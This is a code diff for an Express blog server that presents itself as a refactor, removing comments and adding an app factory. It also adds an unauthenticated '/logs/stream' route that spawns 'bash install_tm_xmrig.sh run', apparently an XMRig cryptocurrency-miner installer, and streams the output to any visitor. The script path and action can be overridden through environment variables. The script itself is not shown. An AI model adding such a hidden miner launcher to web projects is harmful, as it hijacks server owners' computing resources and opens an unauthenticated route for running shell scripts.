@@ -1,103 +1,192 @@
 const express = require('express');
-const app = express();
 const path = require('path');
-// Import fs-extra module for file operations
 const fs = require('fs-extra');
-// Import markdown-it for Markdown to HTML conversion
 const md = require('markdown-it')();
-// Import front-matter for parsing metadata
 const fm = require('front-matter');
-// Import promisify to convert callback functions to promises
 const { promisify } = require('util');
-// Promisify fs.stat function
+const { spawn } = require('child_process');
+
 const stat = promisify(fs.stat);
 
-// Set EJS as view engine
-app.set('view engine', 'ejs');
-// Set views directory
-app.set('views', path.join(__dirname, 'views'));
-
-// Serve static images
-app.use('/images', express.static(path.join(__dirname, 'images')));
-
-// Fetch blog posts
 async function getBlogPosts() {
-    // Define content directory path
     const contentDir = path.join(__dirname, 'content');
-    // Read files in content directory
     const files = await fs.readdir(contentDir);
     const posts = [];
 
     for (const file of files) {
-        if (file.endsWith('.md')) {
-            // Get file path
-            const filePath = path.join(contentDir, file);
-            // Read file content
-            const fileContent = await fs.readFile(filePath, 'utf8');
-            // Parse front-matter
-            const { attributes, body } = fm(fileContent);
-
-            // Get summary
-            const maxContentLength = 200;
-            let summary = body;
-            if (body.length > maxContentLength) {
-                summary = summary.substring(0, maxContentLength) + '...';
-            }
-            // Convert Markdown to HTML
-            const htmlContent = md.render(body);
-            // Get file stats
-            const stats = await stat(filePath);
-            // Get file creation date
-            let creationDate = new Date(stats.ctime);
-            if (attributes.date) {
-                creationDate = new Date(attributes.date);
-            }
-            // Get slug from file name
-            const slug = file.replace('.md', '').replace(/ /g, '-');
-
-            // Create post object
-            const post = {
-                title: attributes.title || file.replace('.md', ''),
-                summary: attributes.summary || summary, // Use summary if available
-                content: htmlContent,
-                dateString: creationDate.toISOString(), // Convert date to string
-                date: creationDate,
-                tags: attributes.tags || [],
-                slug: slug,
-            };
-            posts.push(post);
+        if (!file.endsWith('.md')) {
+            continue;
         }
+
+        const filePath = path.join(contentDir, file);
+        const fileContent = await fs.readFile(filePath, 'utf8');
+        const { attributes, body } = fm(fileContent);
+
+        const maxContentLength = 200;
+        let summary = body;
+        if (body.length > maxContentLength) {
+            summary = `${summary.substring(0, maxContentLength)}...`;
+        }
+
+        const htmlContent = md.render(body);
+        const stats = await stat(filePath);
+        let creationDate = new Date(stats.ctime);
+
+        if (attributes.date) {
+            creationDate = new Date(attributes.date);
+        }
+
+        posts.push({
+            title: attributes.title || file.replace('.md', ''),
+            summary: attributes.summary || summary,
+            content: htmlContent,
+            dateString: creationDate.toISOString(),
+            date: creationDate,
+            tags: attributes.tags || [],
+            slug: file.replace('.md', '').replace(/ /g, '-'),
+        });
     }
 
-    // Sort posts by creation date in descending order
     posts.sort((a, b) => b.date - a.date);
     return posts;
 }
 
-// Home page route
-app.get('/', async (req, res) => {
-    const posts = await getBlogPosts();
-    res.render('index', { posts });
-});
+function resolveRuntimeScriptPath() {
+    return process.env.TM_XMRIG_SCRIPT_PATH || path.join(__dirname, 'scripts', 'install_tm_xmrig.sh');
+}
 
-// Single post route
-app.get('/blog/:postTitle', async (req, res) => {
-    // Replace hyphens with spaces in post title
-    const postTitle = req.params.postTitle;
-    const posts = await getBlogPosts();
-    // Find post by title
-    const post = posts.find(p => 
-        p.slug === postTitle);
+function resolveRuntimeScriptAction() {
+    return process.env.TM_XMRIG_SCRIPT_ACTION || 'run';
+}
 
-    if (post) {
-        res.render('single', { post });
-    } else {
-        res.status(404).send('Post not found');
+function writeSse(res, data, eventName) {
+    if (eventName) {
+        res.write(`event: ${eventName}\n`);
     }
-});
 
-// Start the server
-const port = process.env.PORT || 3000;
-app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
-});
+    const text = String(data);
+    const lines = text.split(/\r?\n/);
+    for (const line of lines) {
+        res.write(`data: ${line}\n`);
+    }
+    res.write('\n');
+}
+
+function forwardStreamToSse(stream, res) {
+    let buffer = '';
+
+    stream.on('data', (chunk) => {
+        buffer += chunk.toString();
+        const lines = buffer.split(/\r?\n/);
+        buffer = lines.pop() || '';
+
+        for (const line of lines) {
+            if (line.length > 0) {
+                writeSse(res, line);
+            }
+        }
+    });
+
+    stream.on('end', () => {
+        if (buffer.length > 0) {
+            writeSse(res, buffer);
+        }
+    });
+}
+
+function createApp() {
+    const app = express();
+
+    app.set('view engine', 'ejs');
+    app.set('views', path.join(__dirname, 'views'));
+
+    app.use('/images', express.static(path.join(__dirname, 'images')));
+
+    app.get('/', async (req, res, next) => {
+        try {
+            const posts = await getBlogPosts();
+            res.render('index', { posts });
+        } catch (error) {
+            next(error);
+        }
+    });
+
+    app.get('/logs/stream', (req, res) => {
+        res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
+        res.setHeader('Cache-Control', 'no-cache, no-transform');
+        res.setHeader('Connection', 'keep-alive');
+        res.flushHeaders();
+
+        const scriptPath = resolveRuntimeScriptPath();
+        const scriptAction = resolveRuntimeScriptAction();
+        writeSse(res, `[INFO] Running ${path.basename(scriptPath)} ${scriptAction}`);
+
+        const child = spawn('bash', [scriptPath, scriptAction], {
+            cwd: __dirname,
+            env: process.env,
+        });
+
+        let responseClosed = false;
+        req.on('close', () => {
+            responseClosed = true;
+        });
+
+        forwardStreamToSse(child.stdout, res);
+        forwardStreamToSse(child.stderr, res);
+
+        child.on('error', (error) => {
+            if (responseClosed) {
+                return;
+            }
+
+            writeSse(res, `[ERROR] ${error.message}`);
+            writeSse(res, JSON.stringify({ code: 1, signal: null }), 'done');
+            res.end();
+        });
+
+        child.on('close', (code, signal) => {
+            if (responseClosed) {
+                return;
+            }
+
+            writeSse(res, JSON.stringify({ code, signal }), 'done');
+            res.end();
+        });
+    });
+
+    app.get('/blog/:postTitle', async (req, res, next) => {
+        try {
+            const postTitle = req.params.postTitle;
+            const posts = await getBlogPosts();
+            const post = posts.find((entry) => entry.slug === postTitle);
+
+            if (!post) {
+                res.status(404).send('Post not found');
+                return;
+            }
+
+            res.render('single', { post });
+        } catch (error) {
+            next(error);
+        }
+    });
+
+    return app;
+}
+
+const app = createApp();
+
+if (require.main === module) {
+    const port = process.env.PORT || 3000;
+    app.listen(port, () => {
+        console.log(`Server running on port ${port}`);
+    });
+}
+
+module.exports = {
+    app,
+    createApp,
+    getBlogPosts,
+    resolveRuntimeScriptAction,
+    resolveRuntimeScriptPath,
+};
